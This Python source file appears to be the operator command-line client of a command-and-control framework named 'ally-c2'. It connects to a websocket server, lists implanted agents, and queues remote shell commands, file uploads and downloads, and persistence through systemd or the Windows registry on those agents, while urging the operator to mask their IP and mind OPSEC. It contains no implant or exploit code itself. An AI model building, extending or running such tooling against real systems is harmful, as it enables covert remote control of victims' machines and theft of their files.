from os import sendfile
import readline #for semi shell interaction in input()
import asyncio
import json
import websockets


#-----
#### colors for printing #####
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
PURPLE = "\033[38;2;128;0;255m"
BLUE = "\033[34m"

def banner():
    print(f"""{PURPLE}

                                                                                                      
         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.     88 88
        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88 88 
       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88 88
      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88 88
     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88 88
    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88 88
   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88 88
  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88 88
 .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88 88
.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'     88 88


    {RESET}""")

def warning():
    banner()
    print(f"{BOLD}{RED}[!] warning [!]{RESET}\n")
    print("REMEMBER to take precaution and mask your ip\n")

    while True:
        con = input("do you want to continue[y/n] ").lower()
        if con == "y" or con == "n":
            break

    if con == "y":
        return True

    return False


    

def all_actions(actions):
    if actions == "main":
        print(f"""
    normal prompt
    - exit
    - help
    - clear
    - build
        ip||url /port/ windows||linux

    - list-agent 
    - use <agent id>

              """)

    if actions == "use":
        print(f"""
    anget use
    - back
        back to server mode
    - help
    - clear

    - sh <shell cmd>
    - upload <mypath> <agentpath>
    - download  <agentpath> <mypath>

    - dir-sh
        direct shell via ws [{RED}can lower your OPSEC{RESET}]

    - percistance 
        systemd, windows reg
        
              """)
    

def clear():
    print("\033[2J\033[H", end="")
def command_not_fount():
    print(f"-- [{RED}-{RESET}] command not found")
#-----



async def use_agent(websocket, agent_id):

    while True:
        shell_cmd = await asyncio.to_thread(input, f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > ")
        shell_cmd= shell_cmd.strip().lower()

        if not shell_cmd:
            continue

        parts = shell_cmd.split()
        action = parts[0]
        
        if action == "back":
            print(f"\n{BLUE}[*]{RESET} exit use mode\n")
            return
        elif action == "help":
            all_actions("use")
            continue
        elif action == "clear":
            clear()
            continue
        elif action == "sh":
            await useMode_wsCom(websocket,shell_cmd,agent_id)
        elif action == "download":
            await useMode_wsCom(websocket,shell_cmd,agent_id)
        elif action == "upload":
            await useMode_wsCom(websocket,shell_cmd,agent_id)
        elif action == "percistance":
            await useMode_wsCom(websocket,shell_cmd,agent_id)

        else:
            command_not_fount()
            




async def useMode_wsCom(websocket,shell_cmd,agent_id):
    # Per i comandi operativi, inviamo l'azione corretta al server FastAPI
        # Mappiamo il comando inserito nel payload "queue_task"
        payload = {
            "action": "queue_task",
            "agent_id": agent_id,
            "data": shell_cmd
        }
        
        await websocket.send(json.dumps(payload))
        response_raw = await websocket.recv()
        response = json.loads(response_raw)
        
        print(f"\n[Server Response] -> {response.get('output')}\n")



# async def serverMode_wsCom( websocket, cmd):
#     payload = {
#             "action": "run_command",
#             "data": cmd
#             }
#
#     # Invia il messaggio come JSON
#     await websocket.send(json.dumps(payload))
#
#     # Attende e riceve la risposta dal server
#     response_raw = await websocket.recv()
#     response = json.loads(response_raw)


async def main(server_url):

    if not warning():
        return

    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
    print(f"all the possible actions\n")
   

    try: 
        async with websockets.connect(server_url) as websocket:
            while True:
                cmd = await asyncio.to_thread(input, f"{BOLD}{RED}server{RESET}[ally-c2] > ")
                cmd = cmd.strip().lower()

                if not cmd:
                    continue
                parts = cmd.lower().split()
                action = parts[0]


                if action == "exit":
                    print("\nthanks for using ally-c2!\n")
                    return
                elif action == "help":
                    all_actions("main")
                    continue
                elif action == "clear":
                    clear()
                    continue
                elif action == "build":
                    print("working on")
                    continue




                elif action == "list-agent":
                    payload = {"action": "list_agents"}
                    await websocket.send(json.dumps(payload))
                    response = json.loads(await websocket.recv())
                    print(f"\n[Active Agents]:\n {response.get('agents')}\n")
                    continue

                elif action == "use":
                    if len(parts) < 2:
                        print(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)")
                        continue
                    
                    agent_id = parts[1]
                    print(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n")
                    
                    await use_agent(websocket, agent_id)
                    continue
                

                else:
                    command_not_fount()










    except websockets.exceptions.ConnectionClosed:
        print("[-] Connection closed form server.")
    except Exception as e:
        print(f"[-] Error of connection: {e}")


if __name__ == "__main__":

    server_url = "ws://192.168.1.172:8080/ws/operator"

    try:
        asyncio.run(main(server_url))
    except KeyboardInterrupt:
        print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")




